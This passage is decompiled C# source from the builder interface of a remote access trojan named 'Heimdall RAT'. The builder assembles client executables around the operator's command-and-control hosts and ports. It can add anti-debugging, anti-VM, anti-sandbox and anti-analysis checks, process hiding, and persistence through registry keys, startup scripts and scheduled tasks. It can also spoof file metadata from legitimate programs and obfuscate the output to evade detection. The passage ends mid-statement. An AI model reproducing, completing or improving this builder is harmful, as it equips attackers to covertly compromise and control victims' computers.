		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0055: Expected O, but got Unknown
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_009c: Expected O, but got Unknown
		Graphics graphics = e.get_Graphics();
		Brush brush = new Pen(Color.FromArgb(0, 0, 0, 0)).get_Brush();
		Rectangle rectangle = new Rectangle(0, 0, TextRenderer.MeasureText(((Form)this).get_Text(), new Font(((Control)this).get_Font(), (FontStyle)0)).Width, TextRenderer.MeasureText(((Form)this).get_Text(), new Font(((Control)this).get_Font(), (FontStyle)0)).Height);
		graphics.FillRectangle(brush, rectangle);
		e.get_Graphics().DrawString(Label1.get_Text(), new Font(((Control)this).get_Font(), (FontStyle)0), Brushes.get_White(), 0f, 0f);
	}

	private void InstallInformationToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					s.Send(Conversions.ToInteger(val.get_ToolTipText()), "CIN");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Button5_Click(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Invalid comparison between Unknown and I4
		try
		{
			OpenFileDialog val = new OpenFileDialog();
			try
			{
				((FileDialog)val).set_Filter("Executable |*.exe");
				if ((int)((CommonDialog)val).ShowDialog() == 1)
				{
					FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(((FileDialog)val).get_FileName());
					ass1.set_Text(Path.GetFileNameWithoutExtension(((FileDialog)val).get_FileName()));
					ass2.set_Text(versionInfo.FileDescription);
					ass3.set_Text(versionInfo.CompanyName);
					ass4.set_Text(versionInfo.ProductName);
					ass5.set_Text(versionInfo.LegalCopyright);
					ass6.set_Text(versionInfo.LegalTrademarks);
					ass7.set_Text(versionInfo.ProductVersion);
					ass8.set_Text(versionInfo.FileVersion);
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void CBass_CheckedChanged(object sender, EventArgs e)
	{
		((Control)GroupBox3).set_Enabled(CBass.get_Checked());
	}

	private void Button4_Click_1(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Invalid comparison between Unknown and I4
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Expected O, but got Unknown
		OpenFileDialog val = new OpenFileDialog();
		((FileDialog)val).set_DefaultExt("ico");
		((FileDialog)val).set_Filter("Icons|*.ico");
		((FileDialog)val).set_Title("Select icon");
		OpenFileDialog val2 = val;
		if ((int)((CommonDialog)val2).ShowDialog() == 1)
		{
			if (((FileDialog)val2).get_FileName().Length == 0)
			{
				Interaction.MsgBox((object)"Make sure there is no space in the Icon path or Icon name.", (MsgBoxStyle)48, (object)null);
				return;
			}
			Icon val3 = new Icon(((FileDialog)val2).get_FileName());
			iconbox.set_Image((Image)(object)val3.ToBitmap());
			((Control)iconbox).set_Tag((object)((FileDialog)val2).get_FileName().ToString());
		}
	}

	private void RBnoicon_CheckedChanged(object sender, EventArgs e)
	{
		if (RDicon.get_Checked())
		{
			((Control)addicon).set_Enabled(true);
			((Control)iconbox).set_Enabled(true);
			return;
		}
		((Control)addicon).set_Enabled(false);
		iconbox.set_Image((Image)null);
		((Control)iconbox).set_Enabled(false);
		((Control)iconbox).set_Tag((object)"");
	}

	public string MsgboxSettings(int A, int B)
	{
		string text = default(string);
		switch (A)
		{
		case 0:
			text = Conversions.ToString(2);
			break;
		case 1:
			text = Conversions.ToString(3);
			break;
		case 2:
			text = Conversions.ToString(5);
			break;
		case 3:
			text = Conversions.ToString(1);
			break;
		case 4:
			text = Conversions.ToString(4);
			break;
		case 5:
			text = Conversions.ToString(0);
			break;
		}
		string text2 = default(string);
		switch (B)
		{
		case 0:
			text2 = Conversions.ToString(64);
			break;
		case 1:
			text2 = Conversions.ToString(32);
			break;
		case 2:
			text2 = Conversions.ToString(48);
			break;
		case 3:
			text2 = Conversions.ToString(16);
			break;
		case 4:
			text2 = Conversions.ToString(0);
			break;
		}
		return text2 + "|" + text;
	}

	private void MSGICON_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (MSGICON.get_SelectedIndex() == 0)
		{
			MSGPic.set_Image((Image)(object)SystemIcons.get_Information().ToBitmap());
		}
		else if (MSGICON.get_SelectedIndex() == 1)
		{
			MSGPic.set_Image((Image)(object)SystemIcons.get_Question().ToBitmap());
		}
		else if (MSGICON.get_SelectedIndex() == 2)
		{
			MSGPic.set_Image((Image)(object)SystemIcons.get_Warning().ToBitmap());
		}
		else if (MSGICON.get_SelectedIndex() == 3)
		{
			MSGPic.set_Image((Image)(object)SystemIcons.get_Error().ToBitmap());
		}
		else if (MSGICON.get_SelectedIndex() == 4)
		{
			MSGPic.set_Image((Image)null);
		}
	}

	private void Button3_Click(object sender, EventArgs e)
	{
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		string[] array = Strings.Split(MsgboxSettings(MSGBUTTON.get_SelectedIndex(), MSGICON.get_SelectedIndex()).ToString(), "|", -1, (CompareMethod)0);
		MessageBoxIcon val = (MessageBoxIcon)int.Parse(array[0]);
		MessageBoxButtons val2 = (MessageBoxButtons)int.Parse(array[1]);
		MessageBox.Show(MSGB.get_Text(), MSGT.get_Text(), val2, val);
	}

	private void CheckBox8_CheckedChanged(object sender, EventArgs e)
	{
		if (CBMSG.get_Checked())
		{
			((Control)MSGBUTTON).set_Enabled(true);
			((Control)MSGICON).set_Enabled(true);
			((Control)MSGB).set_Enabled(true);
			((Control)MSGT).set_Enabled(true);
			((Control)MSGPic).set_Enabled(true);
			((Control)MSGPRI).set_Enabled(true);
			((Control)Label6).set_Enabled(true);
			((Control)Label7).set_Enabled(true);
			((Control)Label28).set_Enabled(true);
			((Control)Label29).set_Enabled(true);
		}
		else
		{
			((Control)Label6).set_Enabled(false);
			((Control)Label7).set_Enabled(false);
			((Control)Label28).set_Enabled(false);
			((Control)Label29).set_Enabled(false);
			((Control)MSGBUTTON).set_Enabled(false);
			((Control)MSGICON).set_Enabled(false);
			((Control)MSGB).set_Enabled(false);
			((Control)MSGT).set_Enabled(false);
			((Control)MSGPic).set_Enabled(false);
			((Control)MSGPRI).set_Enabled(false);
		}
	}

	private void CBdrop_CheckedChanged(object sender, EventArgs e)
	{
		if (CBdrop.get_Checked())
		{
			((Control)GroupBox11).set_Enabled(true);
		}
		else
		{
			((Control)GroupBox11).set_Enabled(false);
		}
	}

	private void CBREG_CheckedChanged(object sender, EventArgs e)
	{
		if (CBREG.get_Checked())
		{
			((Control)GroupBox12).set_Enabled(true);
		}
		else
		{
			((Control)GroupBox12).set_Enabled(false);
		}
	}

	private void CBST_CheckedChanged(object sender, EventArgs e)
	{
		if (CBST.get_Checked())
		{
			((Control)GroupBox13).set_Enabled(true);
		}
		else
		{
			((Control)GroupBox13).set_Enabled(false);
		}
	}

	private void CBSEXE_CheckedChanged(object sender, EventArgs e)
	{
		if (CBSEXE.get_Checked())
		{
			((Control)TBSEXE).set_Enabled(true);
		}
		else
		{
			((Control)TBSEXE).set_Enabled(false);
		}
	}

	private void CBURL_CheckedChanged(object sender, EventArgs e)
	{
		if (CBURL.get_Checked())
		{
			((Control)TBURL).set_Enabled(true);
		}
		else
		{
			((Control)TBURL).set_Enabled(false);
		}
	}

	private void CBJS_CheckedChanged(object sender, EventArgs e)
	{
		if (CBJS.get_Checked())
		{
			((Control)TBJS).set_Enabled(true);
		}
		else
		{
			((Control)TBJS).set_Enabled(false);
		}
	}

	private void CBVBS_CheckedChanged(object sender, EventArgs e)
	{
		if (CBVBS.get_Checked())
		{
			((Control)TBVBS).set_Enabled(true);
		}
		else
		{
			((Control)TBVBS).set_Enabled(false);
		}
	}

	private void CheckBox4_CheckedChanged(object sender, EventArgs e)
	{
		if (CBPROPRI.get_Checked())
		{
			((Control)CBPROPRIO).set_Enabled(true);
		}
		else
		{
			((Control)CBPROPRIO).set_Enabled(false);
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			((Form)this).set_Text("Heimdall RAT Shozab Haxor Special edition  | @" + Environment.MachineName);
			TabControl2.set_SelectedIndex(1);
			mutextxtbox.set_Text("HM_XeTuM_" + Functions.RandomVariable(12, 15));
			CBPROPRIO.set_SelectedIndex(0);
			MSGBUTTON.set_SelectedIndex(0);
			MSGICON.set_SelectedIndex(0);
			CDP.set_SelectedIndex(0);
			CSPOOFER.set_SelectedIndex(0);
			pumpcb.set_SelectedIndex(0);
			if (!Directory.Exists(Application.get_StartupPath() + "\\Extensions"))
			{
				Directory.CreateDirectory(Application.get_StartupPath() + "\\Extensions");
			}
			if (!File.Exists(Application.get_StartupPath() + "\\Extensions\\mpress.exe"))
			{
				File.WriteAllBytes(Application.get_StartupPath() + "\\Extensions\\mpress.exe", Resources.mpress);
			}
			if (!File.Exists(Application.get_StartupPath() + "\\Extensions\\Resource Hacker.exe"))
			{
				File.WriteAllBytes(Application.get_StartupPath() + "\\Extensions\\Resource Hacker.exe", Resources.Resource_Hacker);
			}
			if (!((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(Application.get_StartupPath() + "\\Users\\"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CreateDirectory(Application.get_StartupPath() + "\\Users\\");
			}
			if (!((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(Application.get_StartupPath() + "\\Profiles\\"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CreateDirectory(Application.get_StartupPath() + "\\Profiles\\");
			}
			if (!File.Exists(Application.get_StartupPath() + "\\Profiles\\Default.ini"))
			{
				File.WriteAllText(Application.get_StartupPath() + "\\Profiles\\Default.ini", Resources._Default);
			}
			Timer1.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		try
		{
			mutextxtbox.set_Text("HMXeTuM_" + Functions.RandomVariable(12, 15));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void SBSLEEP_CheckedChanged(object sender, EventArgs e)
	{
		if (SBSLEEP.get_Checked())
		{
			((Control)sleep).set_Enabled(true);
			((Control)Label8).set_Enabled(true);
			((Control)Label24).set_Enabled(true);
		}
		else
		{
			((Control)Label8).set_Enabled(false);
			((Control)Label24).set_Enabled(false);
			((Control)sleep).set_Enabled(false);
		}
	}

	private void Addhosts_Click(object sender, EventArgs e)
	{
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		if ((Operators.CompareString(hosttxtbox.get_Text(), (string)null, false) == 0) | (Operators.CompareString(Porttxtbox.get_Text(), (string)null, false) == 0))
		{
			MessageBox.Show("you must add your Host or IP!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
		else
		{
			hostsports.get_Items().Add(hosttxtbox.get_Text(), 0).get_SubItems()
				.Add(Porttxtbox.get_Value().ToString());
		}
	}

	private void pumpch_CheckedChanged(object sender, EventArgs e)
	{
		if (pumpch.get_Checked())
		{
			((Control)pumpcb).set_Enabled(true);
			((Control)Pumpv).set_Enabled(true);
		}
		else
		{
			((Control)pumpcb).set_Enabled(false);
			((Control)Pumpv).set_Enabled(false);
		}
	}

	private void CBSPOOF_CheckedChanged(object sender, EventArgs e)
	{
		if (CBSPOOF.get_Checked())
		{
			((Control)CSPOOFER).set_Enabled(true);
		}
		else
		{
			((Control)CSPOOFER).set_Enabled(false);
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Button6_Click(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0114: Invalid comparison between Unknown and I4
		//IL_0149: Unknown result type (might be due to invalid IL or missing references)
		//IL_018d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0194: Expected O, but got Unknown
		//IL_0222: Unknown result type (might be due to invalid IL or missing references)
		//IL_0265: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0377: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b9b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bfa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c49: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d1a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0db4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e4e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f49: Unknown result type (might be due to invalid IL or missing references)
		//IL_1117: Unknown result type (might be due to invalid IL or missing references)
		//IL_1165: Unknown result type (might be due to invalid IL or missing references)
		//IL_1867: Unknown result type (might be due to invalid IL or missing references)
		//IL_187e: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			SaveFileDialog val = new SaveFileDialog();
			((FileDialog)val).set_Filter("EXE|*.exe");
			((FileDialog)val).set_FileName("Client");
			try
			{
				((UpDownBase)recdelay).set_BackColor(Color.White);
				((TextBoxBase)mutextxtbox).set_BackColor(Color.White);
				((TextBoxBase)clientidtextbox).set_BackColor(Color.White);
				hostsports.set_BackColor(Color.White);
				((UpDownBase)sleep).set_BackColor(Color.White);
				((TextBoxBase)TBRV).set_BackColor(Color.White);
				((TextBoxBase)TBRK).set_BackColor(Color.White);
				((TextBoxBase)TBDN).set_BackColor(Color.White);
				((TextBoxBase)TBVBS).set_BackColor(Color.White);
				((TextBoxBase)TBURL).set_BackColor(Color.White);
				((TextBoxBase)TBSEXE).set_BackColor(Color.White);
				((TextBoxBase)TBJS).set_BackColor(Color.White);
				((TextBoxBase)TBSTN).set_BackColor(Color.White);
				((UpDownBase)TBSTT).set_BackColor(Color.White);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			if ((int)((CommonDialog)val).ShowDialog() != 1)
			{
				return;
			}
			saveprofile("Default");
			if (hostsports.get_Items().get_Count() == 0)
			{
				MessageBox.Show("you must add your host or ip!", "Heimdall-RAT", (MessageBoxButtons)0, (MessageBoxIcon)64);
				hostsports.set_BackColor(Color.Red);
				return;
			}
			string text = "";
			string text2 = "";
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = hostsports.get_Items().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val2 = (ListViewItem)enumerator.Current;
					text = text + val2.get_SubItems().get_Item(0).get_Text() + ",";
					text2 = text2 + val2.get_SubItems().get_Item(1).get_Text() + ",";
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			if (decimal.Compare(recdelay.get_Value(), 0m) == 0)
			{
				MessageBox.Show("you must add Reconect Delay value!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
				((UpDownBase)recdelay).set_BackColor(Color.Red);
				return;
			}
			if (Operators.CompareString(clientidtextbox.get_Text(), "", false) == 0)
			{
				MessageBox.Show("you must add Client ID!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
				((TextBoxBase)clientidtextbox).set_BackColor(Color.Red);
				return;
			}
			if (Operators.CompareString(mutextxtbox.get_Text(), "", false) == 0)
			{
				MessageBox.Show("you must add Client Mutex!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
				((TextBoxBase)mutextxtbox).set_BackColor(Color.Red);
				return;
			}
			string text3 = Resources.src.Replace("[%H%]", text).Replace("[%P%]", text2).Replace("[%ID%]", SocketServer.Encode(clientidtextbox.get_Text()))
				.Replace("[%MT%]", mutextxtbox.get_Text())
				.Replace("[%R%]", recdelay.get_Value().ToString())
				.Replace("[%SK%]", Key);
			string text4 = text3;
			if (SBSLEEP.get_Checked())
			{
				if (decimal.Compare(sleep.get_Value(), 0m) == 0)
				{
					MessageBox.Show("you must add sleep value!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
					((UpDownBase)sleep).set_BackColor(Color.Red);
					return;
				}
				text4 = text4.Replace("//sleep", MySettingsProperty.Settings.sersleep.Replace("%S%", sleep.get_Value().ToString())).Replace("%sleep%", sleep.get_Value() + " ms");
			}
			else
			{
				text4 = text4.Replace("//sleep", "");
				text4 = text4.Replace("%sleep%", "False");
			}
			text4 = ((!CBMSG.get_Checked()) ? text4.Replace("//msg", "") : text4.Replace("//msg", MySettingsProperty.Settings.sermsg.Replace("msgb", MSGB.get_Text()).Replace("msgt", MSGT.get_Text()).Replace("OK", MSGBUTTON.get_Items().get_Item(MSGBUTTON.get_SelectedIndex()).ToString())
				.Replace("Stop", MSGICON.get_Items().get_Item(MSGICON.get_SelectedIndex()).ToString())));
			if (ANTID.get_Checked())
			{
				text4 = text4.Replace("//funcantid", MySettingsProperty.Settings.funcantid).Replace("//subd", MySettingsProperty.Settings.subfantid);
				text4 = text4.Replace("%antid%", "True");
			}
			else
			{
				text4 = text4.Replace("//funcantid", "").Replace("//subd", "");
				text4 = text4.Replace("%antid%", "False");
			}
			if (ANTIE.get_Checked())
			{
				text4 = text4.Replace("//funcantiem", MySettingsProperty.Settings.funcantiem).Replace("//subem", MySettingsProperty.Settings.subfantiem);
				text4 = text4.Replace("%antiem%", "True");
			}
			else
			{
				text4 = text4.Replace("//funcantiem", "").Replace("//subem", "");
				text4 = text4.Replace("%antiem%", "False");
			}
			if (ANTISB.get_Checked())
			{
				text4 = text4.Replace("//funcantisb", MySettingsProperty.Settings.funcantisb).Replace("//subsb", MySettingsProperty.Settings.subfantisb);
				text4 = text4.Replace("%antisb%", "True");
			}
			else
			{
				text4 = text4.Replace("//funcantisb", "").Replace("//subsb", "");
				text4 = text4.Replace("%antisb%", "False");
			}
			if (ANTIVM.get_Checked())
			{
				text4 = text4.Replace("//funcantivm", MySettingsProperty.Settings.funcantivm).Replace("//subvm", MySettingsProperty.Settings.subfantivm);
				text4 = text4.Replace("%antivm%", "True");
			}
			else
			{
				text4 = text4.Replace("%antivm%", "False");
				text4 = text4.Replace("//funcantivm", "").Replace("//subvm", "");
			}
			if (ANTIW.get_Checked())
			{
				text4 = text4.Replace("//funcantiw", MySettingsProperty.Settings.funcantiw).Replace("//subw", MySettingsProperty.Settings.subfantiw);
				text4 = text4.Replace("%antiw%", "True");
			}
			else
			{
				text4 = text4.Replace("//funcantiw", "").Replace("//subw", "");
				text4 = text4.Replace("%antiw%", "False");
			}
			if ((CBPROPRI.get_Checked() && CBPROPRIO.get_SelectedIndex() == 0) ? true : false)
			{
				text4 = text4.Replace("//prior", MySettingsProperty.Settings.serprior.Replace("High", "AboveNormal"));
				text4 = text4.Replace("%pro%", "Above Normal");
			}
			else if ((CBPROPRI.get_Checked() && CBPROPRIO.get_SelectedIndex() == 1) ? true : false)
			{
				text4 = text4.Replace("//prior", MySettingsProperty.Settings.serprior.Replace("High", "BelowNormal"));
				text4 = text4.Replace("%pro%", "Below Normal");
			}
			else if ((CBPROPRI.get_Checked() && CBPROPRIO.get_SelectedIndex() == 2) ? true : false)
			{
				text4 = text4.Replace("//prior", MySettingsProperty.Settings.serprior.Replace("High", "RealTime"));
				text4 = text4.Replace("%pro%", "Real Time");
			}
			else if ((CBPROPRI.get_Checked() && CBPROPRIO.get_SelectedIndex() == 3) ? true : false)
			{
				text4 = text4.Replace("//prior", MySettingsProperty.Settings.serprior);
				text4 = text4.Replace("%pro%", "High");
			}
			else if ((CBPROPRI.get_Checked() && CBPROPRIO.get_SelectedIndex() == 4) ? true : false)
			{
				text4 = text4.Replace("//prior", MySettingsProperty.Settings.serprior.Replace("High", "Idle"));
				text4 = text4.Replace("%pro%", "Idle");
			}
			else
			{
				text4 = text4.Replace("%pro%", "False");
				text4 = text4.Replace("//prior", "");
			}
			if (CBHIDEE.get_Checked())
			{
				text4 = text4.Replace("//hide", MySettingsProperty.Settings.serhide);
				text4 = text4.Replace("%hide%", "True");
			}
			else
			{
				text4 = text4.Replace("%hide%", "False");
				text4 = text4.Replace("//hide", "");
			}
			text4 = (((!CBdrop.get_Checked() || CDP.get_SelectedIndex() != 0) && 0 == 0) ? (((!CBdrop.get_Checked() || CDP.get_SelectedIndex() != 1) && 0 == 0) ? (((!CBdrop.get_Checked() || CDP.get_SelectedIndex() != 2) && 0 == 0) ? (((!CBdrop.get_Checked() || CDP.get_SelectedIndex() != 3) && 0 == 0) ? (((!CBdrop.get_Checked() || CDP.get_SelectedIndex() != 4) && 0 == 0) ? text4.Replace("//drop", "") : text4.Replace("//drop", MySettingsProperty.Settings.serdrop.Replace("%DP%", TBDN.get_Text()).Replace("Startup", "Templates"))) : text4.Replace("//drop", MySettingsProperty.Settings.serdrop.Replace("%DP%", TBDN.get_Text()).Replace("Startup", "StartMenu"))) : text4.Replace("//drop", MySettingsProperty.Settings.serdrop.Replace("%DP%", TBDN.get_Text()).Replace("Startup", "MyDocuments"))) : text4.Replace("//drop", MySettingsProperty.Settings.serdrop.Replace("%DP%", TBDN.get_Text()).Replace("Startup", "History"))) : text4.Replace("//drop", MySettingsProperty.Settings.serdrop.Replace("%DP%", TBDN.get_Text()).Replace("Startup", "ApplicationData")));
			if ((CBdrop.get_Checked() && Operators.CompareString(TBDN.get_Text(), "", false) == 0) ? true : false)
			{
				MessageBox.Show("you must add Drop name !", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
				((TextBoxBase)TBDN).set_BackColor(Color.Red);
				TabControl2.set_SelectedIndex(0);
				return;
			}
			if (CBREG.get_Checked())
			{
				if (Operators.CompareString(TBRK.get_Text(), "", false) == 0)
				{
					MessageBox.Show("you must add registry key !", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
					((TextBoxBase)TBRK).set_BackColor(Color.Red);
					TabControl2.set_SelectedIndex(1);
					return;
				}
				if (Operators.CompareString(TBRV.get_Text(), "", false) == 0)
				{
					MessageBox.Show("you must add registry value name!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
					((TextBoxBase)TBRV).set_BackColor(Color.Red);
					TabControl2.set_SelectedIndex(2);
					return;
				}
				text4 = text4.Replace("//reg", MySettingsProperty.Settings.serstrreg.Replace("%RK%", TBRK.get_Text()).Replace("%RV%", TBRV.get_Text()));
				text4 = text4.Replace("%reg%", "True");
			}
			else
			{
				text4 = text4.Replace("%reg%", "False");
				text4 = text4.Replace("//reg", "");
			}
			if (CBSEXE.get_Checked())
			{
				if (Operators.CompareString(TBSEXE.get_Text(), "", false) == 0)
				{
					MessageBox.Show("you must add Startup EXE name!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
					((TextBoxBase)TBSEXE).set_BackColor(Color.Red);
					TabControl2.set_SelectedIndex(1);
					return;
				}
				text4 = text4.Replace("//startupexe", MySettingsProperty.Settings.serstrexe.Replace("%SEXE%", TBSEXE.get_Text()));
			}
			else
			{
				text4 = text4.Replace("//startupexe", "");
			}
			if (CBVBS.get_Checked())
			{
				if (Operators.CompareString(TBVBS.get_Text(), "", false) == 0)
				{
					MessageBox.Show("you must add Statup VBS name!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
					((TextBoxBase)TBVBS).set_BackColor(Color.Red);
					TabControl2.set_SelectedIndex(1);
					return;
				}
				text4 = text4.Replace("//vbs", MySettingsProperty.Settings.serstrvbs.Replace("%SVBS%", TBVBS.get_Text()));
			}
			else
			{
				text4 = text4.Replace("//vbs", "");
			}
			if (CBURL.get_Checked())
			{
				if (Operators.CompareString(TBURL.get_Text(), "", false) == 0)
				{
					MessageBox.Show("you must add Startup URL name!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
					((TextBoxBase)TBURL).set_BackColor(Color.Red);
					TabControl2.set_SelectedIndex(1);
					return;
				}
				text4 = text4.Replace("//url", MySettingsProperty.Settings.serstrurl.Replace("%SURL%", TBURL.get_Text()));
			}
			else
			{
				text4 = text4.Replace("//url", "");
			}
			text4 = ((!CBURL.get_Checked()) ? text4.Replace("//funcshortc", "") : text4.Replace("//funcshortc", MySettingsProperty.Settings.funcshortcut));
			if (CBJS.get_Checked())
			{
				text4 = text4.Replace("//js", MySettingsProperty.Settings.serstrjs.Replace("%SJS%", TBJS.get_Text()));
				if (Operators.CompareString(TBJS.get_Text(), "", false) == 0)
				{
					MessageBox.Show("you must add Startup JS name!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
					((TextBoxBase)TBJS).set_BackColor(Color.Red);
					TabControl2.set_SelectedIndex(1);
					return;
				}
			}
			else
			{
				text4 = text4.Replace("//js", "");
			}
			if (CBRAND.get_Checked())
			{
				text4 = text4.Replace("Stub", Functions.RandomVariable(7, 9)).Replace("Program", Functions.RandomVariable(9, 10));
			}
			if (CBJS.get_Checked() | CBURL.get_Checked() | CBMSG.get_Checked() | CBVBS.get_Checked() | CBSEXE.get_Checked() | CBdrop.get_Checked() | CBREG.get_Checked() | CBST.get_Checked())
			{
				text4 = text4.Replace("//thrinstall", MySettingsProperty.Settings.serthins);
				text4 = text4.Replace("%start%", "True");
			}
			else
			{
				text4 = text4.Replace("%start%", "False");
				text4 = text4.Replace("//thrinstall", "");
			}
			text4 = ((!(ANTID.get_Checked() | ANTIE.get_Checked() | ANTISB.get_Checked() | ANTIVM.get_Checked() | ANTIW.get_Checked() | CBHIDEE.get_Checked() | CBPROPRI.get_Checked())) ? text4.Replace("//thrbypass", "") : text4.Replace("//thrbypass", MySettingsProperty.Settings.serthbyp));
			if (CBST.get_Checked())
			{
				if (Operators.CompareString(TBSTN.get_Text(), "", false) == 0)
				{
					MessageBox.Show("you must add Scheduled name!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
					((TextBoxBase)TBSTN).set_BackColor(Color.Red);
					TabControl2.set_SelectedIndex(3);
					return;
				}
				if (decimal.Compare(TBSTT.get_Value(), 0m) == 0)
				{
					MessageBox.Show("you must add Scheduled time value!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
					((UpDownBase)TBSTT).set_BackColor(Color.Red);
					TabControl2.set_SelectedIndex(3);
					return;
				}
				text4 = text4.Replace("//sch", MySettingsProperty.Settings.sersched.Replace("%SN%", TBSTN.get_Text()).Replace("%ST%", TBSTT.get_Value().ToString()));
				text4 = text4.Replace("%sched%", "True");
			}
			else
			{
				text4 = text4.Replace("%sched%", "False");
				text4 = text4.Replace("//sch", "");
			}
			Functions.codcom(Code: (!CBass.get_Checked()) ? text4.Replace("//ass", "") : text4.Replace("//ass", MySettingsProperty.Settings.serass.Replace("%a1%", ass1.get_Text()).Replace("%a2%", ass2.get_Text()).Replace("%a3%", ass3.get_Text())
				.Replace("%a4%", ass4.get_Text())
				.Replace("%a5%", ass5.get_Text())
				.Replace("%a6%", ass6.get_Text())
				.Replace("%a7%", ass7.get_Text())
				.Replace("%a8%", ass8.get_Text())), fin: ((FileDialog)val).get_FileName());
			try
			{
				if ((File.Exists(((FileDialog)val).get_FileName()) && (ATAM.get_Checked() | ANIL.get_Checked() | OPT.get_Checked() | STEN.get_Checked() | Obfu.get_Checked())) ? true : false)
				{
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					ProcessStartInfo processStartInfo2 = processStartInfo;
					processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo2.WorkingDirectory = Application.get_StartupPath() + "\\Extensions\\";
					processStartInfo2.FileName = "dotNET_Reactor.exe";
					processStartInfo2.CreateNoWindow = false;
					processStartInfo2.Verb = "runas";
					string text5 = "";
					text5 = "dotNET_Reactor.exe -file \"" + ((FileDialog)val).get_FileName() + "\"";
					if (ATAM.get_Checked())
					{
						text5 += " -antitamp[1]";
					}
					if (ANIL.get_Checked())
					{
						text5 += " -suppressildasm[1]";
					}
					if (OPT.get_Checked())
					{
						text5 += " -obfuscate_public_types[1]";
					}
					if (STEN.get_Checked())
					{
						text5 += " -stringencryption[1]";
					}
					if (Obfu.get_Checked())
					{
						text5 += " -obfuscation[1]";
					}
					processStartInfo2.Arguments = text5 + " -targetfile \"" + ((FileDialog)val).get_FileName() + "\"";
					Process.Start(processStartInfo)!.WaitForExit();
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (File.Exists(Path.GetDirectoryName(((FileDialog)val).get_FileName()) + "\\" + Path.GetFileNameWithoutExtension(((FileDialog)val).get_FileName()) + Path.GetExtension(((FileDialog)val).get_FileName())!.ToLower() + ".hash"))
				{
